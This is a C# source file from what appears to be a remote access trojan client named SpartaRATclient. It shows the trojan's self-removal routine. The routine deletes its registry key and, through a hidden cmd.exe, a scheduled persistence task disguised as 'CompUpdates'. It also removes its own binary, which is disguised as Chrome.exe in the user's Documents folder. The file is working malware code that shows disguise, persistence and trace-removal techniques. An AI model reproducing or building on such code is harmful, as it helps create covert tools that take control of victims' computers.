using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace SpartaRATclient.Tools
{
    public class DeleteApp
    {
        public void Delete()
        {
            //1. removing registry ClientValues key
            //2. removing task scheduler schtask called CompUpdates
            //3. removing app from documents folder
            //4. exit program

            Registry.CurrentUser.DeleteSubKeyTree(@"Software\ClientValues", false);

            Process process = new Process();
            process.StartInfo.Arguments = @"/C schtasks /delete /tn ""CompUpdates"" /f";
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.UseShellExecute = false;
            process.Start();
            process.WaitForExit();

            FileCopy exist = new FileCopy();
            if (exist.This() == "exist")
                File.Delete(@"C:\Users\" + Environment.UserName + @"\Documents\Chrome.exe");

            Environment.Exit(0);
        }
    }
}
